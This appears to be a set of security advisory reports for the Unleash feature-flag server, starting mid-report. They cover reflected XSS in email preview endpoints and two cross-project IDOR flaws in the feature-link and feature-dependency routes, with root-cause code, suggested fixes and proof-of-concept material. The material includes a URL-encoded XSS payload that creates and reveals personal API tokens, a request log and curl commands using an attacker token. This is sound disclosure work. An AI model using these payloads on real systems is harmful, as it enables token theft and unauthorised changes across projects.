http://TARGET/api/admin/email/preview/html/scheduled-change-conflict?conflictingChangeRequestLink=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E

http://TARGET/api/admin/email/preview/html/scheduled-execution-failed?errorMessage=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
```

2. To leverage this XSS vulnerability for exfiltrating Personal API tokens, a <script> tag is used to trigger a POST request to the /api/admin/user/tokens API endpoint as follows. Sample payload:

```
http://TARGET/api/admin/email/preview/html/scheduled-execution-failed?errorMessage=%3Cscript%3Efetch%28%27%2Fapi%2Fadmin%2Fuser%2Ftokens%27%2C%7Bmethod%3A%27POST%27%2Ccredentials%3A%27include%27%2Cheaders%3A%7B%27Content-Type%27%3A%27application%2Fjson%27%7D%2Cbody%3AJSON.stringify%28%7Bdescription%3A%27poc-%27%2BDate.now%28%29%2CexpiresAt%3A%272099-01-01T00%3A00%3A00.000Z%27%7D%29%7D%29.then%28r%3D%3Er.json%28%29%29.then%28d%3D%3E%7Bdocument.body.innerHTML%3D%27%3Ch1%3E%27%2B%28d.secret%7C%7C%28%27ERR%20%27%2BJSON.stringify%28d%29%29%29%2B%27%3C%2Fh1%3E%27%7D%29%3C%2Fscript%3E
```
--> After open this link, Personal API tokens will create and response.


## Suggested fix
- **Apply HTML output encoding on this render path.** Nothing reaching the template from the query string is currently encoded.

summary: Cross-project IDOR in Unleash feature links: update/delete/create a feature link by id without binding it to the URL project
description:
# Cross-project IDOR in feature links — update/delete/create a link by id without binding it to the URL project

## Affected
- Repo: `Unleash/unleash`
- Version: **8.0.3** (reproduced on the `unleashorg/unleash-server:latest` image, which is 8.0.3; sink unchanged on `main` @ `0c27435b5ec9446b70d0e0543356055ced317be0`)
- Feature-links is GA (`release: { stable: '8' }`), mounted unconditionally — not behind a flag.

## Summary
`PUT` / `DELETE` / `POST` on `/api/admin/projects/:projectId/features/:featureName/link[/:linkId]` are guarded by `permission: UPDATE_FEATURE`. The RBAC middleware evaluates that permission against the **`:projectId` taken from the URL**, but `FeatureLinkService` then fetches and mutates the link by its **bare `:linkId` primary key** (or, for create, by a globally-unique `:featureName`) with no check that the link/feature actually belongs to `:projectId`/`:featureName`.

A user who holds `UPDATE_FEATURE` on **any one project** can therefore overwrite, delete, or inject feature links belonging to a feature in **any other project** — by naming their own project in the URL (to satisfy RBAC) and the victim's `linkId` (or the victim feature's globally-unique name) in the path.

This is the same class as the already-patched **GHSA-5ffh-6f9q-5hhr** (strategy `set-sort-order`): "RBAC authorizes the URL `:projectId`, but the handler writes body/param IDs by primary key without verifying they belong to that project." The feature-links controller was not covered by that fix or by GHSA-8xcj / GHSA-72h8.

## Root cause (file:line)
`src/lib/features/feature-links/feature-link-service.ts`
```ts
async updateLink({ projectId, linkId }, updatedLink, auditUser) {
  const preData = await this.featureLinkStore.get(linkId);          // fetch by bare PK
  if (!preData) throw new NotFoundError(...);
  const link = await this.featureLinkStore.update(linkId, {...});    // update by bare PK
  // no check that preData belongs to projectId / featureName
}

async deleteLink({ projectId, linkId }, auditUser) {
  const link = await this.featureLinkStore.get(linkId);             // fetch by bare PK
  if (!link) throw new NotFoundError(...);
  await this.featureLinkStore.delete(linkId);                        // delete by bare PK
  // no check that link belongs to projectId / featureName
}

async createLink(projectId, newLink, auditUser) {
  const featureExists = await this.featuresReadModel.featureExists(newLink.featureName); // GLOBAL existence only
  // no check that newLink.featureName belongs to projectId
  ...insert...
}
```
`src/lib/features/feature-links/feature-link-controller.ts` — `PATH_LINK = '/:projectId/features/:featureName/link/:linkId'`, all routes `permission: UPDATE_FEATURE`.
`src/lib/middleware/rbac-middleware.ts` — `projectId = findParam('projectId', req)` (i.e. the URL param), then `hasPermission(user, UPDATE_FEATURE, projectId)`.

The sibling write paths in the same codebase already do the binding: `updateStrategy`/`patchStrategy`/`deleteStrategy` call `validateUpdatedProperties(context, existingStrategy)` (rejects a mismatched `projectId`/`featureName`), the `set-sort-order` fix (GHSA-5ffh) rejects body IDs not in the URL's environment, and feature reads call `validateFeatureBelongsToProject()`. Feature links do none of these.

## Impact
A low-privilege project member crosses the project boundary to:
- **Overwrite** a foreign feature link's URL/title — e.g. repoint a "Runbook"/"Dashboard" link that teammates click to an attacker-controlled phishing/malicious URL.
- **Inject** a new attacker-controlled link onto a foreign feature (needs only the victim feature's globally-unique name — no `linkId`).
- **Delete** foreign feature links (destroy documentation/runbook links).
- **Reassign** a foreign link into their own project/feature (the update writes `feature_name` from the URL).
- **Corrupt the audit log**: the emitted `FeatureLink{Updated,Removed,Added}Event` is attributed to the URL's `project`/`featureName`, not the link's real owner.

## CVSS
`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N` = **4.3 (Medium)** — identical to the sibling **GHSA-5ffh-6f9q-5hhr** (cross-project integrity write). `PR:L` = the attacker needs `UPDATE_FEATURE` on one project; write/delete additionally require the victim `linkId` (obtainable by a read-only viewer on the victim project, by prior membership, or via any export/log leak), while the create/inject variant needs only the victim feature's (globally-unique) name.

## CWE
CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-863 (Incorrect Authorization), CWE-284.

## Proof of concept (runtime, unleash-server 8.0.3)
Full script + docker-compose in the attached PoC. As a **non-admin** user, with the control request denied and the cross-project requests accepted:

```
[4] CONTROL — PUT /api/admin/projects/victim-proj-y/features/victim-flag/link/<id>      -> 403  (RBAC enforced on the URL project)
[5] EXPLOIT — PUT /api/admin/projects/default/features/atk-flag-x/link/<victim linkId>  -> 204  victim link (project Y) URL overwritten + reassigned into caller's project
[5b] EXPLOIT — POST /api/admin/projects/default/features/victim-flag/link              -> 204  attacker link injected onto victim feature (project Y)
[6] EXPLOIT — DELETE /api/admin/projects/default/features/whatever/link/<victim linkId> -> 204  victim link (project Y) deleted
```
The `404`/`403` on the URL-named project vs `204` on a project the caller is authorized for — while the *link that changes belongs to a different project* — is the vulnerability: `:linkId`/`:featureName` are decoupled from the authorized `:projectId`.

Note on scope: the full privilege-boundary crossing (a member of project A only reaching project B) depends on Unleash's project-scoped RBAC (Pro/Enterprise). The attached OSS runtime proves the code defect end-to-end (a request authorized for project X mutates/deletes/injects links in project Y) plus that RBAC is evaluated against the URL project (403 control) and that a non-admin can trigger it. This mirrors how GHSA-5ffh was confirmed/rated Medium and GHSA-8xcj was published despite "cannot be confirmed without Enterprise access."

## Suggested fix
Bind every request to the URL context before writing, exactly as the strategy paths do:
- `updateLink` / `deleteLink`: after `featureLinkStore.get(linkId)`, verify the link's `feature_name` resolves to a feature whose `project === projectId` (and, ideally, `=== featureName`); otherwise throw `NotFound`/`Forbidden`. Reuse `validateFeatureBelongsToProject()`.
- `createLink`: verify the URL `featureName` belongs to `projectId` (not just `featureExists` globally).
- Optionally scope the store `update`/`delete` with the project/feature rather than by primary key alone.

## Not a duplicate
Checked the repo's advisories: GHSA-5ffh (strategy set-sort-order), GHSA-8xcj (clone-feature source project), GHSA-72h8 (segment missing-`await` + variant/strategy/env-info/tag). None covers `feature-links`; no published advisory or open PR mentions `feature_link`/`/link`. This is the un-fixed sibling of that same access-control class.

---
*Reporter: Abdullah Kareem ("cyberkareem") - https://cyberkareem.com*

summary: cross-project IDOR on feature-dependency routes: the child/parent feature is never checked against the URL project
description:
### Summary
The feature-dependency routes under /api/admin/projects/:projectId/features/:child/dependencies authorize the caller against the projectId in the URL (the RBAC middleware checks UPDATE_FEATURE_DEPENDENCY, a project-scoped permission), but they never verify that the child feature actually lives in that project. A user who has UPDATE_FEATURE_DEPENDENCY on project A can add and remove feature dependencies on features that belong to project B, where they have no role at all. That changes how B's flags evaluate in production, sidesteps B's change-request approval, and records the audit event under A instead of B.

This looks like the same cross-project IDOR class as GHSA-72h8-wp98-7hch (patched in 8.0.3), which added project-scope checks across segment / variants / strategy-read / getEnvironmentInfo / tags. The dependent-features route wasn't part of that sweep, so it's still open. Re-confirmed live at current HEAD on 2026-07-18: the dependent-features service still guards only featureExists(parent) and featuresInTheSameProject(child, parent); featureExistsInProject appears nowhere in that service.

### Details
Location: src/lib/features/dependent-features/dependent-features-service.ts

addFeatureDependency only runs these guards:

```
const [grandchildren, grandparents, parentExists, sameProject] =
    await Promise.all([
        this.dependentFeaturesReadModel.getChildren([child]),
        this.dependentFeaturesReadModel.getParents(parent),
        this.featuresReadModel.featureExists(parent),                 // global existence
        this.featuresReadModel.featuresInTheSameProject(child, parent), // child+parent same project as EACH OTHER
    ]);
```

featureExists(parent) is a global existence check, and featuresInTheSameProject(child, parent) only checks that child and parent are in the same project as one another, not that either is in the projectId from the URL. There's no featureExistsInProject(child, projectId) call anywhere in this service (zero hits when grepped at HEAD). deleteFeatureDependency and deleteFeatureDependencies are worse: they key the store delete on (parent, child) / child with no project constraint at all.

The right helper already exists: FeaturesReadModel.featureExistsInProject (features-read-model.ts:20) is used elsewhere in the codebase, just not on these routes.

### Impact
Two primitives:

- Add: a user with UPDATE_FEATURE_DEPENDENCY on project A adds a dependency between two features that both live in project B (the sameProject check forces both into B, and it's satisfied because they are in the same project as each other, which just isn't A). This changes B's flag evaluation and bypasses B's change-request workflow.
- - Delete: no project constraint at all, so a user with the permission on A can remove dependencies from any feature in any project.
In all cases the audit event is stored with project: projectId (= A), so the change is attributed to the wrong project, which also undermines the audit trail.

### PoC
Multi-project setup with normal RBAC. Attacker is a member of project A only, with the "update feature dependency" permission there (or any custom role that grants UPDATE_FEATURE_DEPENDENCY). Victim project B has two flags, b_parent and b_child. Feature names are instance-unique and commonly known.

```
# Attacker token is scoped to project A. childFeature + parentFeature are in B.
# The URL project is A (attacker has the permission there); the features are B's.

curl -X POST \
  "$UNLEASH/api/admin/projects/A/features/b_child/dependencies" \
  -H "Authorization: $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"feature":"b_parent","enabled":true}'

# -> 200. A dependency b_child depends-on b_parent is now created in project B,
#    with no role in B, no change-request approval, and the audit event
#    attributed to project A.

# Delete primitive (no project constraint at all):
curl -X DELETE \
  "$UNLEASH/api/admin/projects/A/features/b_child/dependencies/b_parent" \
  -H "Authorization: $ATTACKER_TOKEN"
# -> removes the dependency on B's feature.
```

To confirm the read side, view b_child in project B (as a B user) and its dependency now reflects the attacker's change; or check the event log and see the FEATURE_DEPENDENCY_ADDED event recorded under project A.

### Suggested fix
On the dependency add and delete routes, verify the child feature belongs to the URL project before doing anything, using the helper that already exists:

```
const childInProject = await this.featuresReadModel.featureExistsInProject(child, projectId);
if (!childInProject) {
    throw new NotFoundError(`Feature ${child} not found in project ${projectId}`);
}
```

That's the same shape the GHSA-72h8 fix applied to the other routes (for example the tags route now checks toggle.project === projectId). A good regression test is a two-project setup asserting that a token scoped to A cannot add or delete a dependency on a feature in B.

### Why I don't think it's a duplicate
GHSA-72h8-wp98-7hch (High, patched 8.0.3) is the parent class and it swept segment / variants / strategy-read / getEnvironmentInfo / tags, but not the dependent-features route. GHSA-5ffh (strategy reorder) and GHSA-8xcj (clone-feature) are different endpoints. I couldn't find any advisory or open PR covering the dependency route specifically. The repo's own e2e test for this area only exercises a parent/child project mismatch that the sameProject check already catches, not the both-in-B-via-A case.

### How I found it and a note on tooling
After GHSA-72h8 landed I went looking for cross-project routes the sweep might have missed, and the dependent-features service stood out because it only checks same-project-as-each-other, never same-project-as-the-URL. I used AI assistance while investigating, but I traced the controller, service, store, and read-model and re-confirmed the guard is still absent at HEAD myself. GitHub handle arpitjain099 if you want to add me to the advisory, and I can send the fix as a PR once you've triaged.
